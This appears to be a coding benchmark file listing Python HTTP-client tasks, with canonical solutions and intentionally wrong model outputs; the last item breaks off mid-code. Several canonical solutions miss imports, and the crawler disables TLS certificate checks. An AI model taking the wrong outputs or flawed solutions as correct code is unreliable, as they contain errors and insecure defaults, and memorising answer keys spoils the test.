[
  {
    "Task_id": 101,
    "Instruction": "Task Description: Create a Python class that implements a ScalarFunction to retrieve geographic location information for a given IP address using an external API.\n\nClass Description: The GetLocation class extends PyFlink's ScalarFunction to provide IP-to-location functionality. It makes HTTP requests to the ip2location.io API and processes the response to extract country, state, and city information.\n\nAttributes: None\n\nMethods:\n- eval(ip_address: str) -> str: \n  Takes an IP address as input, queries the ip2location.io API, and returns a JSON string containing the country code, region name, and city name. If the request fails, returns an empty JSON object. The API key is retrieved from environment variables.\n\n  Input Parameters:\n  - ip_address: str - The IP address to look up\n\n  Return Type:\n  - str - JSON string containing location information in format {'country': str, 'state': str, 'city': str} or empty object if request fails",
    "Canonical_solution": "import os\nimport json\nimport requests\nfrom pyflink.table.udf import ScalarFunction\nfrom pyflink.table import DataTypes\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address):\n        url = \"https://api.ip2location.io\"\n        response = requests.get(url, params={\n            'ip': ip_address,\n            'key': os.environ.get(\"IP_CODING_KEY\")\n        })\n\n        if response.status_code != 200:\n            return json.dumps({})\n\n        data = json.loads(response.text)\n        country = data.get('country_code', '')\n        state = data.get('region_name', '')\n        city = data.get('city_name', '')\n        return json.dumps({'country': country, 'state': state, 'city': city})",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "from pyflink.datastream import StreamExecutionEnvironment\nfrom pyflink.common import WatermarkStrategy, Time\nfrom pyflink.datastream.functions import ScalarFunction\nimport requests\nimport os\nimport json\n\nclass GetLocation(ScalarFunction):\n    def eval(self, ip_address: str) -> str:\n        api_key = os.getenv('IP2LOCATION_API_KEY')\n        if not api_key:\n            return json.dumps({})\n        \n        url = f'https://ip2location.io/api?ip={ip_address}&key={api_key}'\n        try:\n            response = requests.get(url)\n            response.raise_for_status()\n            data = response.json()\n            return json.dumps({\n                'country': data.get('countryName'),\n                'state': data.get('regionName'),\n                'city': data.get('cityName')\n            })\n        except requests.RequestException:\n            return json.dumps({})"
  },
  {
    "Task_id": 104,
    "Instruction": "Task Description: Create a function that performs HTTP requests using the Python requests library, handling different HTTP methods and processing both requests and responses appropriately.\n\nFunction Description: The function should make HTTP requests to a specified URL using a given HTTP method (GET, POST, PUT, DELETE, etc.). For GET requests, it should ignore any payload, while for other methods it should properly format and send a JSON payload if provided. The function should return the response status code, headers, and body in a structured format, or an error message if the request fails.\n\nInput:\n- method (str): The HTTP method to use (e.g., 'GET', 'POST', 'PUT', 'DELETE').\n- url (str): The target URL for the HTTP request.\n- payload_json (Optional[str]): A JSON string representing the request payload (ignored for GET requests).\n\nOutput:\n- dict: A dictionary containing:\n  - 'status_code' (int): The HTTP response status code.\n  - 'headers' (dict): The response headers as a dictionary.\n  - 'body' (str): The response body as text.\n  - OR 'error' (str): An error message if the request fails.",
    "Canonical_solution": "import os\nimport requests\nfrom typing import Optional\nfrom letta.utils import json_dumps, json_loads\n\ndef http_request(self, method: str, url: str, payload_json: Optional[str] = None):\n    \"\"\"\n    Generates an HTTP request and returns the response.\n\n    Args:\n        method (str): The HTTP method (e.g., 'GET', 'POST').\n        url (str): The URL for the request.\n        payload_json (Optional[str]): A JSON string representing the request payload.\n\n    Returns:\n        dict: The response from the HTTP request.\n    \"\"\"\n    try:\n        headers = {\"Content-Type\": \"application/json\"}\n\n        # For GET requests, ignore the payload\n        if method.upper() == \"GET\":\n            print(f\"[HTTP] launching GET request to {url}\")\n            response = requests.get(url, headers=headers)\n        else:\n            # Validate and convert the payload for other types of requests\n            if payload_json:\n                payload = json_loads(payload_json)\n            else:\n                payload = {}\n            print(f\"[HTTP] launching {method} request to {url}, payload=\\n{json_dumps(payload, indent=2)}\")\n            response = requests.request(method, url, json=payload, headers=headers)\n\n        return {\"status_code\": response.status_code, \"headers\": dict(response.headers), \"body\": response.text}\n    except Exception as e:\n        return {\"error\": str(e)}",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "{\n  \"method\": \"GET\",\n  \"url\": \"https://api.example.com/data\",\n  \"payload_json\": null\n}"
  },
  {
    "Task_id": 106,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with a remote API, featuring automatic retries for failed requests, background polling for data refresh, and graceful shutdown handling.\n\nClass Description: The Fetcher class provides a robust HTTP client implementation for API interactions with features like exponential backoff retries, periodic background data refreshing, and proper thread cleanup on program exit.\n\nAttributes:\n- _base_url: str - The base URL for API endpoints\n- _api_key: str - API key for authentication\n- _stop_polling_event: Event - Threading event to control polling thread lifecycle\n- _exit_monitor: Thread - Thread that monitors main thread for program exit\n- _poller_thread: Thread - Thread that handles periodic data refreshing\n\nMethods:\n- __init__(base_url: str, api_key: str) -> None - Initializes the fetcher with API configuration\n- run() -> None - Starts the background polling and exit monitoring threads\n- post(api: str, body: Dict[str, str]) -> None - Sends a POST request to specified API endpoint\n- _fetch_url(url: str, api_key: str) -> Dict - Performs a GET request with retry logic (private)\n- _post_url(url: str, api_key: str, body: Dict[str, str]) -> None - Performs a POST request (private)\n- _thread_func(base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int]) -> None - Background polling thread function (private)\n- _refresh_data(base_url: str, api_key: str) -> None - Refreshes data from multiple endpoints (private)\n- _monitor_exit(exit_event: Event) -> None - Monitors main thread for program exit (private)",
    "Canonical_solution": "import logging\nimport os\nimport threading\nimport time\nimport typing\nimport requests\n\nfrom threading import Thread, Event\nfrom typing import Dict, Optional\nfrom tenacity import (\n    RetryError,\n    retry,\n    stop_after_attempt,\n    wait_exponential,\n    retry_if_exception,\n)\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str):\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = Thread(\n            target=self._monitor_exit, args=(self._stop_polling_event,), daemon=True\n        )\n        self._poller_thread = Thread(\n            target=self._thread_func,\n            args=(\n                self._base_url,\n                self._api_key,\n                self._stop_polling_event,\n                int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_POLLING_INTERVAL\") or 5),\n            ),\n        )\n\n    def run(self):\n        self._refresh_data(self._base_url, self._api_key)\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]):\n        self._post_url(f\"{self._base_url}/v1/traceloop/{api}\", self._api_key, body)\n\n    @retry(\n        wait=wait_exponential(multiplier=1, min=4),\n        stop=stop_after_attempt(int(os.getenv(\"TRACELOOP_PROMPT_MANAGER_MAX_RETRIES\") or 3)),\n        retry=retry_if_exception(lambda e: isinstance(e, requests.exceptions.HTTPError) and (500 <= e.response.status_code < 600),\n    )\n    def _fetch_url(self, url: str, api_key: str):\n        response = requests.get(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n        )\n\n        if response.status_code != 200:\n            if response.status_code == 401 or response.status_code == 403:\n                logging.error(\"Authorization error: Invalid Traceloop API key.\")\n                raise requests.exceptions.HTTPError(response=response)\n            else:\n                logging.error(\"Request failed: %s\", response.status_code)\n                raise requests.exceptions.HTTPError(response=response)\n        else:\n            return response.json()\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]):\n        response = requests.post(\n            url,\n            headers={\n                \"Authorization\": f\"Bearer {api_key}\",\n                \"X-Traceloop-SDK-Version\": \"1.0.0\",\n            },\n            json=body,\n        )\n\n        if response.status_code != 200:\n            raise requests.exceptions.HTTPError(response=response)\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int] = 5):\n        while not stop_polling_event.is_set():\n            try:\n                self._refresh_data(base_url, api_key)\n            except RetryError:\n                logging.error(\"Request failed after retries : stopped polling\")\n                break\n\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str):\n        self._fetch_url(f\"{base_url}/v1/traceloop/prompts\", api_key)\n        self._fetch_url(f\"{base_url}/v1/traceloop/pii/tracing-allow-list\", api_key)\n\n    def _monitor_exit(self, exit_event: Event):\n        main_thread = threading.main_thread()\n        main_thread.join()\n        exit_event.set()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import threading\nimport time\nimport requests\nfrom threading import Event\nfrom typing import Dict, Optional\n\nclass Fetcher:\n    def __init__(self, base_url: str, api_key: str) -> None:\n        self._base_url = base_url\n        self._api_key = api_key\n        self._stop_polling_event = Event()\n        self._exit_monitor = threading.Thread(target=self._monitor_exit, daemon=True)\n        self._poller_thread = threading.Thread(target=self._thread_func, daemon=True)\n\n    def run(self) -> None:\n        self._exit_monitor.start()\n        self._poller_thread.start()\n\n    def post(self, api: str, body: Dict[str, str]) -> None:\n        url = f\"{self._base_url}/{api}\"\n        self._post_url(url, self._api_key, body)\n\n    def _fetch_url(self, url: str, api_key: str) -> Dict:\n        retries = 3\n        backoff = 1\n        for i in range(retries):\n            try:\n                response = requests.get(url, headers={\"Authorization\": f\"Bearer {api_key}\"})\n                response.raise_for_status()\n                return response.json()\n            except requests.exceptions.RequestException as e:\n                if i == retries - 1:\n                    raise\n                time.sleep(backoff)\n                backoff *= 2\n        return {}\n\n    def _post_url(self, url: str, api_key: str, body: Dict[str, str]) -> None:\n        headers = {\"Authorization\": f\"Bearer {api_key}\", \"Content-Type\": \"application/json\"}\n        try:\n            response = requests.post(url, json=body, headers=headers)\n            response.raise_for_status()\n        except requests.exceptions.RequestException as e:\n            print(f\"Request failed: {e}\")\n\n    def _thread_func(self, base_url: str, api_key: str, stop_polling_event: Event, seconds_interval: Optional[int] = 60) -> None:\n        while not stop_polling_event.is_set():\n            self._refresh_data(base_url, api_key)\n            time.sleep(seconds_interval)\n\n    def _refresh_data(self, base_url: str, api_key: str) -> None:\n        endpoints = [\n            f\"{base_url}/data1\",\n            f\"{base_url}/data2\",\n            f\"{base_url}/data3\"\n        ]\n        for endpoint in endpoints:\n            self._fetch_url(endpoint, api_key)\n\n    def _monitor_exit(self, exit_event: Event) -> None:\n        while True:\n            if threading.main_thread().is_alive() and not exit_event.is_set():\n                time.sleep(1)\n            else:\n                break\n        self._stop_polling_event.set()"
  },
  {
    "Task_id": 108,
    "Instruction": "Task Description: Implement a web crawler class that can fetch HTML content from single or multiple URLs, with support for threaded operations and error handling.\n\nClass Description: SimpleCrawler is a class designed to fetch HTML content from web pages either individually or in parallel using threading. It handles various HTTP request scenarios and errors while maintaining proper logging.\n\nAttributes:\n_results: dict - Stores fetched HTML content when operating in threaded mode\nMAX_FILE_SIZE: int - Maximum allowed file size for fetched content (20MB)\nMIN_FILE_SIZE: int - Minimum allowed file size for fetched content (10 bytes)\nLOGGER: Logger - Logger instance for error and debug messages\nUSER_AGENT: str - User agent string for HTTP requests\nHEADERS: dict - Default headers for HTTP requests\n\nMethods:\nfetch_url(url: str, request_args: dict = None) -> str - Fetches HTML content from a single URL\nInput:\n  url: str - URL to fetch\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\n_fetch_url(url: str, is_threaded: bool, request_args: dict = None) -> str - Internal method that performs the actual URL fetching\nInput:\n  url: str - URL to fetch\n  is_threaded: bool - Flag indicating if operation is threaded\n  request_args: dict (optional) - Additional arguments for the request\nOutput:\n  str - HTML content of the URL or None if failed\n\nfetch_urls(urls: list, request_args: dict = None) -> dict - Fetches HTML content from multiple URLs in parallel using threads\nInput:\n  urls: list - List of URLs to fetch\n  request_args: dict (optional) - Additional arguments for the requests\nOutput:\n  dict - Dictionary mapping URLs to their HTML content",
    "Canonical_solution": "import socket\nimport copy\nimport threading\nimport logging\nimport requests\nimport urllib3\nfrom .response_decoder import decode_response\n\nMAX_FILE_SIZE = 20000000\nMIN_FILE_SIZE = 10\n\nLOGGER = logging.getLogger(__name__)\nUSER_AGENT = \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\"\nHEADERS = {\n    \"Connection\": \"close\",\n    \"User-Agent\": USER_AGENT,\n}\nurllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)\n\nclass SimpleCrawler:\n    _results = {}\n\n    def __init__(self):\n        pass\n\n    def fetch_url(self, url, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and returns the html\n        :param url: URL to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: HTML content of the URL\n        \"\"\"\n        return self._fetch_url(url, False, request_args=request_args)\n\n    def _fetch_url(self, url, is_threaded, request_args=None):\n        \"\"\"\n        Crawls the html content of the parameter url and saves the html in _results\n        :param url: URL to fetch\n        :param is_threaded: If True, results will be stored for later processing\n        :param request_args: optional arguments that `request` takes\n        :return: html of the url\n        \"\"\"\n        if request_args is None:\n            request_args = {}\n        if \"headers\" not in request_args:\n            request_args[\"headers\"] = HEADERS\n\n        html_str = None\n        try:\n            response = requests.get(\n                url, verify=False, allow_redirects=True, **request_args)\n            \n            if response.status_code != 200:\n                LOGGER.error(\"not a 200 response: %s\", response.status_code)\n            elif response.text is None or len(response.text) < MIN_FILE_SIZE:\n                LOGGER.error(\"too small/incorrect: %s %s\", url, len(response.text))\n            elif len(response.text) > MAX_FILE_SIZE:\n                LOGGER.error(\"too large: %s %s\", url, len(response.text))\n            else:\n                html_str = decode_response(response)\n                \n        except (requests.exceptions.MissingSchema, requests.exceptions.InvalidURL):\n            LOGGER.error(\"malformed URL: %s\", url)\n        except requests.exceptions.TooManyRedirects:\n            LOGGER.error(\"too many redirects: %s\", url)\n        except requests.exceptions.SSLError as err:\n            LOGGER.error(\"SSL: %s %s\", url, err)\n        except (socket.timeout, requests.exceptions.ConnectionError, \n               requests.exceptions.Timeout, socket.error, socket.gaierror) as err:\n            LOGGER.error(\"connection/timeout error: %s %s\", url, err)\n            \n        if is_threaded:\n            self._results[url] = html_str\n        return html_str\n\n    def fetch_urls(self, urls, request_args=None):\n        \"\"\"\n        Crawls the html content of all given urls in parallel.\n        :param urls: List of URLs to fetch\n        :param request_args: optional arguments that `request` takes\n        :return: Dictionary of URL to HTML content mappings\n        \"\"\"\n        threads = [\n            threading.Thread(target=self._fetch_url, args=(url, True, request_args))\n            for url in urls\n        ]\n        for thread in threads:\n            thread.start()\n        for thread in threads:\n            thread.join()\n\n        results = copy.deepcopy(self._results)\n        self._results = {}\n        return results",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import logging\nimport threading\nimport requests\n\nclass SimpleCrawler:\n    _results = {}\n    MAX_FILE_SIZE = 20 * 1024 * 1024\n    MIN_FILE_SIZE = 10\n    LOGGER = logging.getLogger(__name__)\n    USER_AGENT = 'SimpleCrawler/1.0'\n    HEADERS = {\n        'User-Agent': USER_AGENT,\n        'Accept-Encoding': 'gzip, deflate',\n        'Connection': 'keep-alive'\n    }\n\n    def fetch_url(self, url: str, request_args: dict = None) -> str:\n        try:\n            return self._fetch_url(url, is_threaded=False, request_args=request_args)\n        except Exception as e:\n            self.LOGGER.error(f\"Error fetching URL {url}: {str(e)}\")\n            return None\n\n    def _fetch_url(self, url: str, is_threaded: bool, request_args: dict = None) -> str:\n        try:\n            if request_args:\n                headers = {**self.HEADERS, **request_args}\n            else:\n                headers = self.HEADERS\n\n            response = requests.get(url, headers=headers, timeout=10)\n            response.raise_for_status()\n\n            content = response.content\n            if self.MIN_FILE_SIZE <= len(content) <= self.MAX_FILE_SIZE:\n                return content.decode('utf-8')\n            else:\n                self.LOGGER.warning(f\"File size for {url} is out of allowed range\")\n                return None\n        except requests.RequestException as e:\n            self.LOGGER.error(f\"Request error for {url}: {str(e)}\")\n            return None\n        except UnicodeDecodeError:\n            self.LOGGER.warning(f\"Unable to decode content from {url}\")\n            return None\n\n    def fetch_urls(self, urls: list, request_args: dict = None) -> dict:\n        self._results = {}\n        threads = []\n\n        def thread_target(url):\n            html = self.fetch_url(url, request_args)\n            self._results[url] = html\n\n        for url in urls:\n            thread = threading.Thread(target=thread_target, args=(url,))\n            threads.append(thread)\n            thread.start()\n\n        for thread in threads:\n            thread.join()\n\n        return self._results"
  },
  {
    "Task_id": 109,
    "Instruction": "Task Description: Implement a Python class to interact with a Plex Media Server using HTTP requests, including functionality for making authenticated requests, validating server connections, and updating media libraries.\n\nClass Description: PlexMediaServer is a class that provides methods to communicate with a Plex Media Server instance. It handles HTTP requests with proper authentication, validates server connections and library access, and triggers library updates.\n\nAttributes:\n- TIMEOUT: [int] - Default timeout in seconds for HTTP requests\n- object: [object] - The media server instance containing configuration options\n\nMethods:\n- __init__(mediaserver_instance: object) -> None - Initializes the PlexMediaServer with a media server instance containing configuration options\n- make_request(uri: str = '/', params: dict = {}) -> requests.Response - Makes an authenticated HTTP GET request to the Plex server with proper headers and SSL verification handling\n- validate() -> bool - Validates the connection to the Plex server and checks if configured libraries exist, raising exceptions for any issues\n- update() -> bool - Triggers refresh operations for all configured libraries, raising exceptions for any failures",
    "Canonical_solution": "import requests\nfrom urllib.parse import urlsplit, urlunsplit, urlencode\nimport warnings\n\nclass PlexMediaServer:\n    TIMEOUT = 5\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/', params={}):\n        headers = {'User-Agent': 'TubeSync'}\n        token = self.object.loaded_options['token']\n        params['X-Plex-Token'] = token\n        base_parts = urlsplit(self.object.url)\n        qs = urlencode(params)\n        url = urlunsplit((base_parts.scheme, base_parts.netloc, uri, qs, ''))\n        \n        if self.object.verify_https:\n            return requests.get(url, headers=headers, verify=True, timeout=self.TIMEOUT)\n        else:\n            with warnings.catch_warnings():\n                warnings.simplefilter(\"ignore\")\n                return requests.get(url, headers=headers, verify=False, timeout=self.TIMEOUT)\n\n    def validate(self):\n        try:\n            response = self.make_request('/library/sections')\n            if response.status_code != 200:\n                check_token = ''\n                if 400 <= response.status_code < 500:\n                    check_token = (' A 4XX error could mean your access token is being rejected.')\n                raise Exception(f'Invalid HTTP status code: {response.status_code}.' + check_token)\n            \n            parsed_response = ElementTree.fromstring(response.content)\n            remote_libraries = {}\n            for parent in parsed_response.iter('MediaContainer'):\n                for d in parent:\n                    library_id = d.attrib['key']\n                    library_name = d.attrib['title']\n                    remote_libraries[library_id] = library_name\n            \n            libraries = self.object.loaded_options['libraries'].strip().split(',')\n            for library_id in libraries:\n                library_id = library_id.strip()\n                if library_id not in remote_libraries:\n                    raise Exception(f'Library ID \"{library_id}\" does not exist on Plex Media Server')\n            return True\n            \n        except Exception as e:\n            raise Exception(f'Validation failed: {str(e)}')\n\n    def update(self):\n        libraries = self.object.loaded_options.get('libraries', '')\n        for library_id in libraries.split(','):\n            library_id = library_id.strip()\n            uri = f'/library/sections/{library_id}/refresh'\n            response = self.make_request(uri)\n            if response.status_code != 200:\n                raise Exception(f'Failed to refresh library \"{library_id}\", status code: {response.status_code}')\n        return True",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\n\nclass PlexMediaServer:\n    TIMEOUT = 10\n\n    def __init__(self, mediaserver_instance):\n        self.object = mediaserver_instance\n\n    def make_request(self, uri='/ ', params={}):\n        headers = {\n            'X-Plex-Token': self.object.token,\n            'Accept': 'application/json'\n        }\n        response = requests.get(f'{self.object.url}{uri}', params=params, headers=headers, verify=self.object.verify_ssl, timeout=self.TIMEOUT)\n        response.raise_for_status()\n        return response\n\n    def validate(self):\n        try:\n            response = self.make_request('/status/version')\n            if response.status_code != 200:\n                raise Exception('Connection to Plex server failed')\n            if not self.object.libraries:\n                raise Exception('No libraries configured')\n            for library in self.object.libraries:\n                if not self._library_exists(library):\n                    raise Exception(f'Library {library} does not exist on server')\n            return True\n        except Exception as e:\n            raise RuntimeError(f'Validation failed: {str(e)}') from e\n\n    def _library_exists(self, library):\n        response = self.make_request(f'/library/sections/{library}')\n        return response.status_code == 200\n\n    def update(self):\n        try:\n            for library in self.object.libraries:\n                self._update_library(library)\n            return True\n        except Exception as e:\n            raise RuntimeError(f'Update failed: {str(e)}') from e\n\n    def _update_library(self, library):\n        response = self.make_request(f'/library/sections/{library}/refresh')\n        if response.status_code != 200:\n            raise Exception(f'Failed to refresh library {library}')"
  },
  {
    "Task_id": 11,
    "Instruction": "Task Description: Implement a Python class to interact with Hurricane Electric's dynamic DNS API for updating DNS records programmatically.\n\nClass Description: HurricaneElectricAPI is a client class that handles communication with Hurricane Electric's DNS service to update DNS records. It supports both direct connections and proxy connections.\n\nAttributes:\n- SITE: [str] - The target domain for the Hurricane Electric API (dyn.dns.he.net)\n- METHOD: [str] - The HTTP method to use for requests (POST)\n- ACTION: [str] - The API endpoint path (nic/update)\n- TOKEN_PARAM: [str] - The parameter name for the authentication token (password)\n- TOKEN: [str] - The authentication token/password for API access\n- PROXY: [str/None] - Optional proxy server address\n\nMethods:\n- __init__(token=\"password\", proxy=None) -> None - Initializes the API client with optional token and proxy settings\n- _request(param=None, **params) -> str - Internal method to make HTTP requests to the API\n- update_record(domain, value, record_type=\"A\") -> str - Updates a DNS record with the given value\n\nMethod Details:\n1. _request(param=None, **params) -> str\n   - Makes an HTTPS request to the Hurricane Electric API\n   - Input:\n     - param: [dict/None] - Optional base parameters\n     - **params: Additional request parameters\n   - Output: [str] - API response string\n   - Raises Exception on HTTP errors or API failures\n\n2. update_record(domain, value, record_type=\"A\") -> str\n   - Updates a DNS record with the specified value\n   - Input:\n     - domain: [str] - The domain name to update\n     - value: [str] - The new IP address or value\n     - record_type: [str] - The DNS record type (default: \"A\")\n   - Output: [str] - Human-readable status message about the update\n   - Raises Exception if the update fails",
    "Canonical_solution": "from http.client import HTTPSConnection\nfrom urllib.parse import urlencode\nfrom logging import info, debug, warning\n\nclass HurricaneElectricAPI:\n    def __init__(self, token=\"password\", proxy=None):\n        self.SITE = \"dyn.dns.he.net\"\n        self.METHOD = \"POST\"\n        self.ACTION = \"nic/update\"\n        self.TOKEN_PARAM = \"password\"\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        if param:\n            params.update(param)\n\n        params.update({self.TOKEN_PARAM: '***'})\n        info(\"%s/%s : %s\", self.SITE, self.ACTION, params)\n        params[self.TOKEN_PARAM] = self.TOKEN\n\n        if self.PROXY:\n            conn = HTTPSConnection(self.PROXY)\n            conn.set_tunnel(self.SITE, 443)\n        else:\n            conn = HTTPSConnection(self.SITE)\n\n        conn.request(self.METHOD, '/' + self.ACTION, urlencode(params), {\n            \"Content-type\": \"application/x-www-form-urlencoded\"\n        })\n        response = conn.getresponse()\n        res = response.read().decode('utf8')\n        conn.close()\n\n        if response.status < 200 or response.status >= 300:\n            warning('%s : error[%d]:%s', self.ACTION, response.status, res)\n            raise Exception(res)\n        else:\n            debug('%s : result:%s', self.ACTION, res)\n            if not res:\n                raise Exception(\"empty response\")\n            elif res[:5] == \"nochg\" or res[:4] == \"good\":\n                return res\n            else:\n                raise Exception(res)\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        info(\">>>>>%s(%s)\", domain, record_type)\n        res = self._request(hostname=domain, myip=value)\n        if res[:4] == \"good\":\n            result = \"Record updated. New IP is: \" + res[5:-1]\n        elif res[:5] == \"nochg\":\n            result = \"IP not changed. IP is: \" + res[6:-1]\n        else:\n            result = \"Record update failed.\"\n        return result",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\n\nclass HurricaneElectricAPI:\n    SITE = \"dyn.dns.he.net\"\n    METHOD = \"POST\"\n    ACTION = \"nic/update\"\n    TOKEN_PARAM = \"password\"\n    TOKEN = \"password\"\n    PROXY = None\n\n    def __init__(self, token=\"password\", proxy=None):\n        self.TOKEN = token\n        self.PROXY = proxy\n\n    def _request(self, param=None, **params):\n        url = f\"https://{self.SITE}/{self.ACTION}\"\n        headers = {\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        data = {}\n        if param:\n            data.update(param)\n        data[self.TOKEN_PARAM] = self.TOKEN\n        data.update(params)\n        proxies = {}\n        if self.PROXY:\n            proxies[\"http\"] = self.PROXY\n            proxies[\"https\"] = self.PROXY\n        response = requests.request(\n            self.METHOD,\n            url,\n            headers=headers,\n            data=data,\n            proxies=proxies\n        )\n        if response.status_code != 200:\n            raise Exception(f\"HTTP error: {response.status_code} - {response.text}\")\n        return response.text\n\n    def update_record(self, domain, value, record_type=\"A\"):\n        params = {\n            \"hostname\": domain,\n            \"ipv4\": value if record_type == \"A\" else \"\",\n            \"ipv6\": value if record_type == \"AAAA\" else \"\"\n        }\n        response = self._request(**params)\n        if \"NOCHG\" in response:\n            return \"DNS record not changed.\"\n        elif \"OK\" in response:\n            return \"DNS record updated successfully.\"\n        else:\n            raise Exception(f\"API error: {response}\")"
  },
  {
    "Task_id": 112,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Pulsstory ExternalSyncAPI, handling authentication, data retrieval, and activity synchronization.\n\nClass Description: The PulsstoryHTTPClient class provides methods to interact with the Pulsstory API, including user authentication, activity download/upload, and token management. It handles HTTP requests, error responses, and data serialization.\n\nAttributes:\n- URLBase: str - The base URL for all API endpoints\n- PULSSTORY_CLIENT_ID: str - Client ID for API authentication\n- PULSSTORY_CLIENT_SECRET: str - Client secret for API authentication\n\nMethods:\n- _api_request(endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict - Internal method to make API requests and handle responses\n- _apiData(service_record: object) -> dict - Helper method to prepare authentication data\n- get_user_id(service_record: object) -> str - Retrieves user ID from the API\n- get_api_uris(service_record: object) -> dict - Gets API endpoint URIs from the service\n- retrieve_authorization_token(code: str) -> str - Exchanges an authorization code for an access token\n- revoke_authorization(service_record: object) -> None - Revokes an existing authorization\n- download_activity(service_record: object, activity_id: str) -> dict - Downloads activity data\n- upload_activity(service_record: object, upload_data: dict, uris: dict) -> str - Uploads activity data as a compressed file",
    "Canonical_solution": "from tapiriik.settings import PULSSTORY_CLIENT_ID, PULSSTORY_CLIENT_SECRET\nimport requests\nimport urllib.parse\nimport json\n\nclass PulsstoryHTTPClient:\n    def __init__(self, base_url, client_id=None, client_secret=None):\n        self.URLBase = base_url\n        self.PULSSTORY_CLIENT_ID = client_id or PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = client_secret or PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint, service_record=None, method=\"POST\", data=None, headers=None, files=None):\n        url = self.URLBase + endpoint\n        request_data = self._apiData(service_record) if service_record else {}\n        if data:\n            request_data.update(data)\n        \n        if method == \"POST\":\n            response = requests.post(url, data=request_data, headers=headers, files=files)\n        else:\n            raise ValueError(\"Unsupported HTTP method\")\n\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization for request\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(f\"Request failed with status {response.status_code}: {response.text}\")\n\n        return response.json()\n\n    def _apiData(self, service_record):\n        return {\"access_token\": service_record.Authorization[\"Token\"]}\n\n    def get_user_id(self, service_record):\n        return self._api_request(\"/ExternalSyncAPI/GetUserId\", service_record)[\"userID\"]\n\n    def get_api_uris(self, service_record):\n        uris = self._api_request(\"/ExternalSyncAPI/Uris\", service_record)\n        for k in uris.keys():\n            if isinstance(uris[k], str):\n                uris[k] = self.URLBase + uris[k]\n        return uris\n\n    def retrieve_authorization_token(self, code):\n        params = {\n            \"code\": code,\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n        response = requests.post(\n            self.URLBase + \"/ExternalSyncAPI/GenerateToken\",\n            data=urllib.parse.urlencode(params),\n            headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}\n        )\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]\n\n    def revoke_authorization(self, service_record):\n        response = requests.post(self.URLBase + \"/ExternalSyncAPI/Deauthorize\", data=self._apiData(service_record))\n        if response.status_code not in [200, 204]:\n            raise APIException(f\"Unable to deauthorize token, status {response.status_code}\")\n\n    def download_activity(self, service_record, activity_id):\n        return self._api_request(activity_id, service_record)\n\n    def upload_activity(self, service_record, upload_data, uris):\n        json_data = json.dumps(upload_data)\n        buffer = io.BytesIO()\n        with zipfile.ZipFile(buffer, 'w') as myzip:\n            myzip.writestr('activity.txt', json_data, compress_type=zipfile.ZIP_DEFLATED)\n        files = {\"data\": buffer.getvalue()}\n        return self._api_request(uris[\"upload_activity_zip\"], service_record, files=files)[\"Id\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "class PulsstoryHTTPClient:\n    def __init__(self, URLBase: str, PULSSTORY_CLIENT_ID: str, PULSSTORY_CLIENT_SECRET: str):\n        self.URLBase = URLBase\n        self.PULSSTORY_CLIENT_ID = PULSSTORY_CLIENT_ID\n        self.PULSSTORY_CLIENT_SECRET = PULSSTORY_CLIENT_SECRET\n\n    def _api_request(self, endpoint: str, service_record: object = None, method: str = \"POST\", data: dict = None, headers: dict = None, files: dict = None) -> dict:\n        import requests\n        url = f\"{self.URLBase}/{endpoint}\"\n        if not headers:\n            headers = {}\n        if not data:\n            data = {}\n        if not files:\n            files = {}\n        if service_record:\n            auth_token = service_record.get(\"auth_token\")\n            if auth_token:\n                headers[\"Authorization\"] = f\"Bearer {auth_token}\"\n        response = requests.request(method, url, data=data, headers=headers, files=files)\n        if response.status_code == 200:\n            return response.json()\n        else:\n            return {\"error\": response.text}\n\n    def _apiData(self, service_record: object) -> dict:\n        return {\n            \"client_id\": self.PULSSTORY_CLIENT_ID,\n            \"client_secret\": self.PULSSTORY_CLIENT_SECRET\n        }\n\n    def get_user_id(self, service_record: object) -> str:\n        return service_record.get(\"user_id\", \"\")\n\n    def get_api_uris(self, service_record: object) -> dict:\n        return 